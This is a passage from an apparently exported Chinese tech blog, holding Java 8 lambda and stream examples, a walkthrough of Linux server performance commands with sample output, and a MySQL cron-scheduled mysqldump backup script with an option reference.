方法来做转换。这并不会限制你，你可以用内建方法，也可以自己定义。在这个Java 8的Map Reduce示例里，我们首先对所有价格应用 12% 的VAT，然后用 reduce() 方法计算总和。123456789101112131415161718// 为每个订单加上12%的税// 老方法：List costBeforeTax = Arrays.asList(100, 200, 300, 400, 500);double total = 0;for (Integer cost : costBeforeTax) { double price = cost + .12*cost; total = total + price;}System.out.println(\"Total : \" + total);// 新方法：List costBeforeTax = Arrays.asList(100, 200, 300, 400, 500);double bill = costBeforeTax.stream().map((cost) -&gt; cost + .12*cost).reduce((sum, cost) -&gt; sum + cost).get();System.out.println(\"Total : \" + bill);输出：Total : 1680.0Total : 1680.0 例7 通过过滤创建一个String列表过滤是Java开发者在大规模集合上的一个常用操作，而现在使用lambda表达式和流API过滤大规模数据集合是惊人的简单。流提供了一个 filter() 方法，接受一个 Predicate 对象，即可以传入一个lambda表达式作为过滤逻辑。下面的例子是用lambda表达式过滤Java集合，将帮助理解。123456// 创建一个字符串列表，每个字符串长度大于2List&lt;String&gt; filtered = strList.stream().filter(x -&gt; x.length()&gt; 2).collect(Collectors.toList());System.out.printf(\"Original List : %s, filtered list : %s %n\", strList, filtered);输出：Original List : [abc, , bcd, , defg, jk], filtered list : [abc, bcd, defg] 另外，关于 filter() 方法有个常见误解。在现实生活中，做过滤的时候，通常会丢弃部分，但使用filter()方法则是获得一个新的列表，且其每个元素符合过滤原则。 例8 对列表的每个元素应用函数我们通常需要对列表的每个元素使用某个函数，例如逐一乘以某个数、除以某个数或者做其它操作。这些操作都很适合用 map() 方法，可以将转换逻辑以lambda表达式的形式放在 map() 方法里，就可以对集合的各个元素进行转换了，如下所示。1234567// 将字符串换成大写并用逗号链接起来List&lt;String&gt; G7 = Arrays.asList(\"USA\", \"Japan\", \"France\", \"Germany\", \"Italy\", \"U.K.\",\"Canada\");String G7Countries = G7.stream().map(x -&gt; x.toUpperCase()).collect(Collectors.joining(\", \"));System.out.println(G7Countries);输出：USA, JAPAN, FRANCE, GERMANY, ITALY, U.K., CANADA 例9 复制不同的值，创建一个子列表本例展示了如何利用流的 distinct() 方法来对集合进行去重。1234567// 用所有不同的数字创建一个正方形列表List&lt;Integer&gt; numbers = Arrays.asList(9, 10, 3, 4, 7, 3, 4);List&lt;Integer&gt; distinct = numbers.stream().map( i -&gt; i*i).distinct().collect(Collectors.toList());System.out.printf(\"Original List : %s, Square Without duplicates : %s %n\", numbers, distinct);输出：Original List : [9, 10, 3, 4, 7, 3, 4], Square Without duplicates : [81, 100, 9, 16, 49] 例10 计算集合最大值、最小值、总和及平均值IntStream、LongStream 和 DoubleStream 等流的类中，有个非常有用的方法叫做 summaryStatistics() 。可以返回 IntSummaryStatistics、LongSummaryStatistics 或者 DoubleSummaryStatistic s，描述流中元素的各种摘要数据。在本例中，我们用这个方法来计算列表的最大值和最小值。它也有 getSum() 和 getAverage() 方法来获得列表的所有元素的总和及平均值。12345678910111213//获取数字的个数、最小值、最大值、总和以及平均值List&lt;Integer&gt; primes = Arrays.asList(2, 3, 5, 7, 11, 13, 17, 19, 23, 29);IntSummaryStatistics stats = primes.stream().mapToInt((x) -&gt; x).summaryStatistics();System.out.println(\"Highest prime number in List : \" + stats.getMax());System.out.println(\"Lowest prime number in List : \" + stats.getMin());System.out.println(\"Sum of all prime numbers : \" + stats.getSum());System.out.println(\"Average of all prime numbers : \" + stats.getAverage());输出：Highest prime number in List : 29Lowest prime number in List : 2Sum of all prime numbers : 129Average of all prime numbers : 12.9 总结在Java世界里面，面向对象还是主流思想，对于习惯了面向对象编程的开发者来说，抽象的概念并不陌生。面向对象编程是对数据进行抽象，而函数式编程是对行为进行抽象。现实世界中，数据和行为并存，程序也是如此，因此这两种编程方式我们都得学。 这种新的抽象方式还有其他好处。很多人不总是在编写性能优先的代码，对于这些人来说，函数式编程带来的好处尤为明显。程序员能编写出更容易阅读的代码——这种代码更多地表达了业务逻辑，而不是从机制上如何实现。易读的代码也易于维护、更可靠、更不容易出错。 在写回调函数和事件处理器时，程序员不必再纠缠于匿名内部类的冗繁和可读性，函数式编程让事件处理系统变得更加简单。能将函数方便地传递也让编写惰性代码变得容易，只有在真正需要的时候，才初始化变量的值。","link":"/2017/04/16/Lambda%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/"},{"title":"Linux服务器性能检测命令集锦","text":"uptime12$ uptime23:51:26 up 21:31, 1 user, load average: 30.02, 26.43, 19.02 这个命令可以快速查看机器的负载情况。在Linux系统中，这些数据表示等待CPU资源的进程和阻塞在不可中断IO进程（进程状态为D）的数量。这些数据可以让我们对系统资源使用有一个宏观的了解。 命令的输出分别表示1分钟、5分钟、15分钟的平均负载情况。通过这三个数据，可以了解服务器负载是在趋于紧张还是区域缓解。如果1分钟平均负载很高，而15分钟平均负载很低，说明服务器正在命令高负载情况，需要进一步排查CPU资源都消耗在了哪里。反之，如果15分钟平均负载很高，1分钟平均负载较低，则有可能是CPU资源紧张时刻已经过去。 上面例子中的输出，可以看见最近1分钟的平均负载非常高，且远高于最近15分钟负载，因此我们需要继续排查当前系统中有什么进程消耗了大量的资源。可以通过下文将会介绍的vmstat、mpstat等命令进一步排查。 dmesg | tail12345678$ dmesg | tail[1880957.563150] perl invoked oom-killer: gfp_mask=0x280da, order=0, oom_score_adj=0[...][18694] 48 31550 101579 3871 0 0 0 服务名称[...][1880957.563400] Out of memory: Kill process 18694 (perl) score 246 or sacrifice child[1880957.563408] Killed process 18694 (perl) total-vm:1972392kB, anon-rss:1953348kB, file-rss:0kB[2320864.954447] TCP: Possible SYN flooding on port 7001. Dropping request. Check SNMP counters. 该命令会输出系统日志的最后10行。通过【dmesg | tail -100f】还可以调整看到的日志总行数。示例中的输出，可以看见一次内核的oom kill和一次TCP丢包。这些日志可以帮助排查性能问题。比如线上某个服务突然异常，你怀疑是机器内存过高，系统自动杀死了这个服务的进程，那么可以通过系统日志排查。 vmstat 112345678$ vmstat 1 100procs ---------memory---------- ---swap-- -----io---- -system-- ------cpu-----r b swpd free buff cache si so bi bo in cs us sy id wa st34 0 0 200889792 73708 591828 0 0 0 5 6 10 96 1 3 0 032 0 0 200889920 73708 591860 0 0 0 592 13284 4282 98 1 1 0 032 0 0 200890112 73708 591860 0 0 0 0 9501 2154 99 1 0 0 032 0 0 200889568 73712 591856 0 0 0 48 11900 2459 99 0 0 0 032 0 0 200890208 73712 591860 0 0 0 0 15898 4840 98 1 1 0 0 vmstat命令，每行会输出一些系统核心指标，这些指标可以让我们更详细的了解系统状态。后面跟的参数1，表示每秒输出一次统计信息，100表示一共输出100次。表头提示了每一列的含义： r 表示运行队列(就是说多少个进程真的分配到CPU)，我测试的服务器目前CPU比较空闲，没什么程序在跑，当这个值超过了CPU数目，就会出现CPU瓶颈了。这个也和top的负载有关系，一般负载超过了3就比较高，超过了5就高，超过了10就不正常了，服务器的状态很危险。top的负载类似每秒的运行队列。如果运行队列过大，表示你的CPU很繁忙，一般会造成CPU使用率很高。 b 表示阻塞的进程,这个不多说，进程阻塞，大家懂的。 swpd 虚拟内存已使用的大小，如果大于0，表示你的机器物理内存不足了，如果不是程序内存泄露的原因，那么你该升级内存了或者把耗内存的任务迁移到其他机器。 free 空闲的物理内存的大小，我的机器内存总共8G，剩余3415M。 buff Linux/Unix系统是用来存储，目录里面有什么内容，权限等的缓存，我本机大概占用300多M cache cache直接用来记忆我们打开的文件,给文件做缓冲，我本机大概占用300多M(这里是Linux/Unix的聪明之处，把空闲的物理内存的一部分拿来做文件和目录的缓存，是为了提高 程序执行的性能，当程序使用内存时，buffer/cached会很快地被使用。) si 每秒从磁盘读入虚拟内存的大小，如果这个值大于0，表示物理内存不够用或者内存泄露了，要查找耗内存进程解决掉。我的机器内存充裕，一切正常。 so 每秒虚拟内存写入磁盘的大小，如果这个值大于0，同上。 bi 块设备每秒接收的块数量，这里的块设备是指系统上所有的磁盘和其他块设备，默认块大小是1024byte，我本机上没什么IO操作，所以一直是0，但是我曾在处理拷贝大量数据(2-3T)的机器上看过可以达到140000/s，磁盘写入速度差不多140M每秒 bo 块设备每秒发送的块数量，例如我们读取文件，bo就要大于0。bi和bo一般都要接近0，不然就是IO过于频繁，需要调整。 in 每秒CPU的中断次数，包括时间中断 cs 每秒上下文切换次数，例如我们调用系统函数，就要进行上下文切换，线程的切换，也要进程上下文切换，这个值要越小越好，太大了，要考虑调低线程或者进程的数目,例如在apache和nginx这种web服务器中，我们一般做性能测试时会进行几千并发甚至几万并发的测试，选择web服务器的进程可以由进程或者线程的峰值一直下调，压测，直到cs到一个比较小的值，这个进程和线程数就是比较合适的值了。系统调用也是，每次调用系统函数，我们的代码就会进入内核空间，导致上下文切换，这个是很耗资源，也要尽量避免频繁调用系统函数。上下文切换次数过多表示你的CPU大部分浪费在上下文切换，导致CPU干正经事的时间少了，CPU没有充分利用，是不可取的。 us 用户CPU时间，我曾经在一个做加密解密很频繁的服务器上，可以看到us接近100,r运行队列达到80(机器在做压力测试，性能表现不佳)。 sy 系统CPU时间，如果太高，表示系统调用时间长，例如是IO操作频繁。 id 空闲 CPU时间，一般来说，id + us + sy = 100,一般我认为id是空闲CPU使用率，us是用户CPU使用率，sy是系统CPU使用率。 wt 等待IO CPU时间。 上述这些CPU时间，可以让我们很快了解CPU是否出于繁忙状态。一般情况下，如果用户时间us和系统时间sy相加非常大，CPU忙于执行指令。必定响应缓慢。如果IO等待时间很长，那么系统的瓶颈可能在磁盘IO。 示例命令的输出可以看见，大量CPU时间消耗在用户态，也就是用户应用程序消耗了CPU时间。这不一定是性能问题，需要结合r队列，一起分析。 mpstat -P ALL 1123456789$ mpstat -P ALL 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)07:38:49 PM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle07:38:50 PM all 98.47 0.00 0.75 0.00 0.00 0.00 0.00 0.00 0.00 0.7807:38:50 PM 0 96.04 0.00 2.97 0.00 0.00 0.00 0.00 0.00 0.00 0.9907:38:50 PM 1 97.00 0.00 1.00 0.00 0.00 0.00 0.00 0.00 0.00 2.0007:38:50 PM 2 98.00 0.00 1.00 0.00 0.00 0.00 0.00 0.00 0.00 1.0007:38:50 PM 3 96.97 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 3.03[...] 该命令可以显示每个CPU的占用情况，如果有一个CPU占用率特别高，那么有可能是一个单线程应用程序引起的。 pidstat 1123456789101112131415$ pidstat 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)07:41:02 PM UID PID %usr %system %guest %CPU CPU Command07:41:03 PM 0 9 0.00 0.94 0.00 0.94 1 rcuos/007:41:03 PM 0 4214 5.66 5.66 0.00 11.32 15 mesos-slave07:41:03 PM 0 4354 0.94 0.94 0.00 1.89 8 java07:41:03 PM 0 6521 1596.23 1.89 0.00 1598.11 27 java07:41:03 PM 0 6564 1571.70 7.55 0.00 1579.25 28 java07:41:03 PM 60004 60154 0.94 4.72 0.00 5.66 9 pidstat07:41:03 PM UID PID %usr %system %guest %CPU CPU Command07:41:04 PM 0 4214 6.00 2.00 0.00 8.00 15 mesos-slave07:41:04 PM 0 6521 1590.00 1.00 0.00 1591.00 27 java07:41:04 PM 0 6564 1573.00 10.00 0.00 1583.00 28 java07:41:04 PM 108 6718 1.00 0.00 0.00 1.00 0 snmp-pass07:41:04 PM 60004 60154 1.00 4.00 0.00 5.00 9 pidstat pidstat命令输出进程的CPU占用率，该命令会持续输出，并且不会覆盖之前的数据，可以方便观察系统动态。如上的输出，可以看见两个JAVA进程占用了将近1600%的CPU时间，既消耗了大约16个CPU核心的运算资源。 iostat -xz 1123456789101112$ iostat -xz 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)avg-cpu: %user %nice %system %iowait %steal %idle 73.96 0.00 3.73 0.03 0.06 22.21Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %utilxvda 0.00 0.23 0.21 0.18 4.52 2.08 34.37 0.00 9.98 13.80 5.42 2.44 0.09xvdb 0.01 0.00 1.02 8.94 127.97 598.53 145.79 0.00 0.43 1.78 0.28 0.25 0.25xvdc 0.01 0.00 1.02 8.86 127.79 595.94 146.50 0.00 0.45 1.82 0.30 0.27 0.26dm-0 0.00 0.00 0.69 2.32 10.47 31.69 28.01 0.01 3.23 0.71 3.98 0.13 0.04dm-1 0.00 0.00 0.00 0.94 0.01 3.78 8.00 0.33 345.84 0.04 346.81 0.01 0.00dm-2 0.00 0.00 0.09 0.07 1.35 0.36 22.50 0.00 2.55 0.23 5.62 1.78 0.03[...] iostat命令主要用于查看机器磁盘IO情况。该命令输出的列，主要含义是： r/s, w/s, rkB/s, wkB/s：分别表示每秒读写次数和每秒读写数据量（千字节）。读写量过大，可能会引起性能问题。await：IO操作的平均等待时间，单位是毫秒。这是应用程序在和磁盘交互时，需要消耗的时间，包括IO等待和实际操作的耗时。如果这个数值过大，可能是硬件设备遇到了瓶颈或者出现故障。avgqu-sz：向设备发出的请求平均数量。如果这个数值大于1，可能是硬件设备已经饱和（部分前端硬件设备支持并行写入）。%util：设备利用率。这个数值表示设备的繁忙程度，经验值是如果超过60，可能会影响IO性能（可以参照IO操作平均等待时间）。如果到达100%，说明硬件设备已经饱和。 如果显示的是逻辑设备的数据，那么设备利用率不代表后端实际的硬件设备已经饱和。值得注意的是，即使IO性能不理想，也不一定意味这应用程序性能会不好，可以利用诸如预读取、写缓存等策略提升应用性能。 free –m12345$ free -m total used free shared buffers cachedMem: 245998 24545 221453 83 59 541-/+ buffers/cache: 23944 222053Swap: 0 0 0 free命令可以查看系统内存的使用情况，-m参数表示按照兆字节展示。最后两列分别表示用于IO缓存的内存数，和用于文件系统页缓存的内存数。需要注意的是，第二行-/+ buffers/cache，看上去缓存占用了大量内存空间。这是Linux系统的内存使用策略，尽可能的利用内存，如果应用程序需要内存，这部分内存会立即被回收并分配给应用程序。因此，这部分内存一般也被当成是可用内存。 如果可用内存非常少，系统可能会动用交换区（如果配置了的话），这样会增加IO开销（可以在iostat命令中提现），降低系统性能。 sar -n DEV12345678910$ sar -n DEV 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)12:16:48 AM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s %ifutil12:16:49 AM eth0 18763.00 5032.00 20686.42 478.30 0.00 0.00 0.00 0.0012:16:49 AM lo 14.00 14.00 1.36 1.36 0.00 0.00 0.00 0.0012:16:49 AM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0012:16:49 AM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s %ifutil12:16:50 AM eth0 19763.00 5101.00 21999.10 482.56 0.00 0.00 0.00 0.0012:16:50 AM lo 20.00 20.00 3.25 3.25 0.00 0.00 0.00 0.0012:16:50 AM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 sar命令在这里可以查看网络设备的吞吐率。在排查性能问题时，可以通过网络设备的吞吐量，判断网络设备是否已经饱和。如示例输出中，eth0网卡设备，吞吐率大概在22 Mbytes/s，既176 Mbits/sec，没有达到1Gbit/sec的硬件上限。 sar -n TCP,ETCP 11234567891011$ sar -n TCP,ETCP 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)12:17:19 AM active/s passive/s iseg/s oseg/s12:17:20 AM 1.00 0.00 10233.00 18846.0012:17:19 AM atmptf/s estres/s retrans/s isegerr/s orsts/s12:17:20 AM 0.00 0.00 0.00 0.00 0.0012:17:20 AM active/s passive/s iseg/s oseg/s12:17:21 AM 1.00 0.00 8359.00 6039.0012:17:20 AM atmptf/s estres/s retrans/s isegerr/s orsts/s12:17:21 AM 0.00 0.00 0.00 0.00 0.00^C ssar命令在这里用于查看TCP连接状态，其中包括： active/s：每秒本地发起的TCP连接数，既通过connect调用创建的TCP连接；passive/s：每秒远程发起的TCP连接数，即通过accept调用创建的TCP连接；retrans/s：每秒TCP重传数量； TCP连接数可以用来判断性能问题是否由于建立了过多的连接，进一步可以判断是主动发起的连接，还是被动接受的连接。TCP重传可能是因为网络环境恶劣，或者服务器压力过大导致丢包。 top123456789101112131415161718$ toptop - 00:15:40 up 21:56, 1 user, load average: 31.09, 29.87, 29.92Tasks: 871 total, 1 running, 868 sleeping, 0 stopped, 2 zombie%Cpu(s): 96.8 us, 0.4 sy, 0.0 ni, 2.7 id, 0.1 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem: 25190241+total, 24921688 used, 22698073+free, 60448 buffersKiB Swap: 0 total, 0 used, 0 free. 554208 cached Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND20248 root 20 0 0.227t 0.012t 18748 S 3090 5.2 29812:58 java 4213 root 20 0 2722544 64640 44232 S 23.5 0.0 233:35.37 mesos-slave66128 titancl+ 20 0 24344 2332 1172 R 1.0 0.0 0:00.07 top 5235 root 20 0 38.227g 547004 49996 S 0.7 0.2 2:02.74 java 4299 root 20 0 20.015g 2.682g 16836 S 0.3 1.1 33:14.42 java 1 root 20 0 33620 2920 1496 S 0.0 0.0 0:03.82 init 2 root 20 0 0 0 0 S 0.0 0.0 0:00.02 kthreadd 3 root 20 0 0 0 0 S 0.0 0.0 0:05.35 ksoftirqd/0 5 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0H 6 root 20 0 0 0 0 S 0.0 0.0 0:06.94 kworker/u256:0 8 root 20 0 0 0 0 S 0.0 0.0 2:38.05 rcu_sched top命令包含了前面好几个命令的检查的内容。比如系统负载情况（uptime）、系统内存使用情况（free）、系统CPU使用情况（vmstat）等。因此通过这个命令，可以相对全面的查看系统负载的来源。同时，top命令支持排序，可以按照不同的列排序，方便查找出诸如内存占用最多的进程、CPU占用率最高的进程等。 第三行CPU详解：us 表示用户进程处理所占的百分比sy 表示为内核线程处理所占的百分比ni 表示被nice命令改变优先级的任务所占的百分比id 表示cpu的空闲时间所占的百分比wa 表示为在执行过程中等待io所占的百分比hi 表示为硬件中断所占的百分比si 表示为软件中断所占的百分比st 表示虚拟cpu等待实际cpu的时间的百分比 一般情况下，用户态CPU和系统态CPU时间比率在3:1到4:1之间是正常的 gstat -gcutil12345678910111213141516$ find / -name jstat/usr/local/java/bin/jstat$ cd /usr/local/java/bin/$ ./jstat -gcutil 29625 1000 10 S0 S1 E O M CCS YGC YGCT FGC FGCT GCT 9.07 0.00 20.93 67.40 94.61 91.96 652 8.926 10 2.371 11.297 9.07 0.00 20.93 67.40 94.61 91.96 652 8.926 10 2.371 11.297 9.07 0.00 20.93 67.40 94.61 91.96 652 8.926 10 2.371 11.297 9.07 0.00 20.93 67.40 94.61 91.96 652 8.926 10 2.371 11.297 9.07 0.00 20.93 67.40 94.61 91.96 652 8.926 10 2.371 11.297 9.07 0.00 20.93 67.40 94.61 91.96 652 8.926 10 2.371 11.297 9.07 0.00 20.93 67.40 94.61 91.96 652 8.926 10 2.371 11.297 9.07 0.00 20.93 67.40 94.61 91.96 652 8.926 10 2.371 11.297 9.07 0.00 20.93 67.40 94.61 91.96 652 8.926 10 2.371 11.297 9.07 0.00 20.93 67.40 94.61 91.96 652 8.926 10 2.371 11.297 S0 — Heap上的 Survivor space 0 区已使用空间的百分比 S1 — Heap上的 Survivor space 1 区已使用空间的百分比 E — Heap上的 Eden space 区已使用空间的百分比 O — Heap上的 Old space 区已使用空间的百分比 P — Perm space 区已使用空间的百分比 YGC — 从应用程序启动到采样时发生 Young GC 的次数 YGCT– 从应用程序启动到采样时 Young GC 所用的时间(单位秒) FGC — 从应用程序启动到采样时发生 Full GC 的次数 FGCT– 从应用程序启动到采样时 Full GC 所用的时间(单位秒) GCT — 从应用程序启动到采样时用于垃圾回收的总时间(单位秒)","link":"/2017/04/25/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%80%A7%E8%83%BD%E6%A3%80%E6%B5%8B%E5%91%BD%E4%BB%A4%E9%9B%86%E9%94%A6/"},{"title":"MySQL定时逻辑备份","text":"当项目数据量不大时，备份可以采用逻辑备份。数据库可以搭建一主一从，从库每天凌晨三点全量逻辑备份。然后同时记录二进制文件，用来进行基于时间点的数据恢复。 其他备份方案详见我的思维导图：MySQL备份与恢复 cron定时任务数据库每天凌晨三点的备份使用的是cron工具。 cron是一个linux下的定时执行工具，可以在无需人工干预的情况下运行作业。Linux下的定时任务便是在crontab文件中加入定制计划来执行。 12345678910111213141516171819202122# vim /etc/crontab SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=rootHOME=/# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed0 3 * * * root sh /data/mysqlbackup/all-databases-backup.sh# run-parts# 01 * * * * root run-parts /etc/cron.hourly //每小时执行/etc/cron.hourly内的脚本# 02 4 * * * root run-parts /etc/cron.daily //每天执行/etc/cron.daily内的脚本# 22 4 * * 0 root run-parts /etc/cron.weekly //每星期执行/etc/cron.weekly内的脚本# 42 4 1 * * root run-parts /etc/cron.monthly //每月去执行/etc/cron.monthly内的脚本 前四行是有关设置cron任务运行的环境变量。SHELL：用来指定系统使用的SHELL环境(该样例为bash shell)。PATH：定义执行命令的路径。MAILTO：cron的输出以电子邮件的形式发给MAILTO变量定义的用户名，如果定义为空(MAILTO=””)，邮件不会发送。HOME：执行命令或脚本时，HOME变量可用来设置基目录。 minute：从0到59的整数hour：从0到23的整数day：从1到31的整数 (必须是指定月份的有效日期)month：从1到12的整数 (或如Jan或Feb简写的月份)dayofweek：从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)command：需要执行的命令(可用as ls /proc &gt;&gt; /tmp/proc或 执行自定义脚本的命令) 大家注意”run-parts”这个参数了，如果去掉这个参数的话，后面就可以写要运行的某个脚本名，而不是文件夹名了。 逻辑备份脚本shell脚本范例： 1234567891011121314151617181920212223242526# vim /data/mysqlbackup/all-databases-backup.sh#!/bin/sh# 全量备份文件名称JIRA_FILE_NAME=all-`date +%Y%m%d%H%M%S`;# 数据备份目录backupDir=/data/mysqlbackup/# 如果备份目录不存在则创建它if [[ ! -e $backupDir ]];then mkdir $backupDirfi# 全库备份cd $backupDir/usr/bin/mysqldump --all-databases &gt; ${JIRA_FILE_NAME}.sql# 压缩文件，并删除sqltar -zcvf ${JIRA_FILE_NAME}.sql.tar.gz ${JIRA_FILE_NAME}.sqlrm -rf ${JIRA_FILE_NAME}.sql# 保留10天数据remove_file_day=`date --date='10 days ago' +%Y%m%d`rm -f all-$remove_file_day* 直接运行脚本的同学可能会发现数据库报错，连接不上。因为全量逻辑备份的命令正常为 【mysqldump -uroot -ppwd —all-databases】，但是上面的脚本为了安全问题省去了用户名和密码，防止他人得到脚本后直接获取用户密码。那脚本执行时，是自动从哪获取的用户和密码呢，其实用户密码配置在 ~/.my.cnf 中。具体配置详见另一篇文章：MySQL安全输入密码的一些操作介绍其中配置最重要的一步就是：一定要保证【.my.cnf】别的用户/组不能读取(chmod 400)… mysqldump参数详解http://doc.mysql.cn/mysql5/refman-5.1-zh.html-chapter/client-side-scripts.html#mysqldump 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320--all-databases , -A导出全部数据库。mysqldump -uroot -p --all-databases--all-tablespaces , -Y导出全部表空间。mysqldump -uroot -p --all-databases --all-tablespaces--no-tablespaces , -y不导出任何表空间信息。mysqldump -uroot -p --all-databases --no-tablespaces--add-drop-database每个数据库创建之前添加drop数据库语句。mysqldump -uroot -p --all-databases --add-drop-database--add-drop-table每个数据表创建之前添加drop数据表语句。(默认为打开状态，使用--skip-add-drop-table取消选项)mysqldump -uroot -p --all-databases (默认添加drop语句)mysqldump -uroot -p --all-databases –skip-add-drop-table (取消drop语句)--add-locks在每个表导出之前增加LOCK TABLES并且之后UNLOCK TABLE。(默认为打开状态，使用--skip-add-locks取消选项)mysqldump -uroot -p --all-databases (默认添加LOCK语句)mysqldump -uroot -p --all-databases –skip-add-locks (取消LOCK语句)--allow-keywords允许创建是关键词的列名字。这由表名前缀于每个列名做到。mysqldump -uroot -p --all-databases --allow-keywords--apply-slave-statements在'CHANGE MASTER'前添加'STOP SLAVE'，并且在导出的最后添加'START SLAVE'。mysqldump -uroot -p --all-databases --apply-slave-statements--character-sets-dir字符集文件的目录mysqldump -uroot -p --all-databases --character-sets-dir=/usr/local/mysql/share/mysql/charsets--comments附加注释信息。默认为打开，可以用--skip-comments取消mysqldump -uroot -p --all-databases (默认记录注释)mysqldump -uroot -p --all-databases --skip-comments (取消注释)--compatible导出的数据将和其它数据库或旧版本的MySQL 相兼容。值可以为ansi、mysql323、mysql40、postgresql、oracle、mssql、db2、maxdb、no_key_options、no_tables_options、no_field_options等，要使用几个值，用逗号将它们隔开。它并不保证能完全兼容，而是尽量兼容。mysqldump -uroot -p --all-databases --compatible=ansi--compact导出更少的输出信息(用于调试)。去掉注释和头尾等结构。可以使用选项：--skip-add-drop-table --skip-add-locks --skip-comments --skip-disable-keysmysqldump -uroot -p --all-databases --compact--complete-insert, -c使用完整的insert语句(包含列名称)。这么做能提高插入效率，但是可能会受到max_allowed_packet参数的影响而导致插入失败。mysqldump -uroot -p --all-databases --complete-insert--compress, -C在客户端和服务器之间启用压缩传递所有信息mysqldump -uroot -p --all-databases --compress--create-options, -a在CREATE TABLE语句中包括所有MySQL特性选项。(默认为打开状态)mysqldump -uroot -p --all-databases--databases, -B导出几个数据库。参数后面所有名字参量都被看作数据库名。mysqldump -uroot -p --databases test mysql--debug输出debug信息，用于调试。默认值为：d:t:o,/tmp/mysqldump.tracemysqldump -uroot -p --all-databases --debugmysqldump -uroot -p --all-databases --debug=” d:t:o,/tmp/debug.trace”--debug-check检查内存和打开文件使用说明并退出。mysqldump -uroot -p --all-databases --debug-check--debug-info输出调试信息并退出mysqldump -uroot -p --all-databases --debug-info--default-character-set设置默认字符集，默认值为utf8mysqldump -uroot -p --all-databases --default-character-set=latin1--delayed-insert采用延时插入方式（INSERT DELAYED）导出数据mysqldump -uroot -p --all-databases --delayed-insert--delete-master-logsmaster备份后删除日志. 这个参数将自动激活--master-data。mysqldump -uroot -p --all-databases --delete-master-logs--disable-keys对于每个表，用/*!40000 ALTER TABLE tbl_name DISABLE KEYS */;和/*!40000 ALTER TABLE tbl_name ENABLE KEYS */;语句引用INSERT语句。这样可以更快地导入dump出来的文件，因为它是在插入所有行后创建索引的。该选项只适合MyISAM表，默认为打开状态。mysqldump -uroot -p --all-databases --dump-slave该选项将导致主的binlog位置和文件名追加到导出数据的文件中。设置为1时，将会以CHANGE MASTER命令输出到数据文件；设置为2时，在命令前增加说明信息。该选项将会打开--lock-all-tables，除非--single-transaction被指定。该选项会自动关闭--lock-tables选项。默认值为0。mysqldump -uroot -p --all-databases --dump-slave=1mysqldump -uroot -p --all-databases --dump-slave=2--events, -E导出事件。mysqldump -uroot -p --all-databases --events--extended-insert, -e使用具有多个VALUES列的INSERT语法。这样使导出文件更小，并加速导入时的速度。默认为打开状态，使用--skip-extended-insert取消选项。mysqldump -uroot -p --all-databasesmysqldump -uroot -p --all-databases--skip-extended-insert (取消选项)--fields-terminated-by导出文件中忽略给定字段。与--tab选项一起使用，不能用于--databases和--all-databases选项mysqldump -uroot -p test test --tab=”/home/mysql” --fields-terminated-by=”#”--fields-enclosed-by输出文件中的各个字段用给定字符包裹。与--tab选项一起使用，不能用于--databases和--all-databases选项mysqldump -uroot -p test test --tab=”/home/mysql” --fields-enclosed-by=”#”--fields-optionally-enclosed-by输出文件中的各个字段用给定字符选择性包裹。与--tab选项一起使用，不能用于--databases和--all-databases选项mysqldump -uroot -p test test --tab=”/home/mysql” --fields-enclosed-by=”#” --fields-optionally-enclosed-by =”#”--fields-escaped-by输出文件中的各个字段忽略给定字符。与--tab选项一起使用，不能用于--databases和--all-databases选项mysqldump -uroot -p mysql user --tab=”/home/mysql” --fields-escaped-by=”#”--flush-logs开始导出之前刷新日志。请注意：假如一次导出多个数据库(使用选项--databases或者--all-databases)，将会逐个数据库刷新日志。除使用--lock-all-tables或者--master-data外。在这种情况下，日志将会被刷新一次，相应的所以表同时被锁定。因此，如果打算同时导出和刷新日志应该使用--lock-all-tables 或者--master-data 和--flush-logs。mysqldump -uroot -p --all-databases --flush-logs--flush-privileges在导出mysql数据库之后，发出一条FLUSH PRIVILEGES 语句。为了正确恢复，该选项应该用于导出mysql数据库和依赖mysql数据库数据的任何时候。mysqldump -uroot -p --all-databases --flush-privileges--force在导出过程中忽略出现的SQL错误。mysqldump -uroot -p --all-databases --force--help显示帮助信息并退出。mysqldump --help--hex-blob使用十六进制格式导出二进制字符串字段。如果有二进制数据就必须使用该选项。影响到的字段类型有BINARY、VARBINARY、BLOB。mysqldump -uroot -p --all-databases --hex-blob--host, 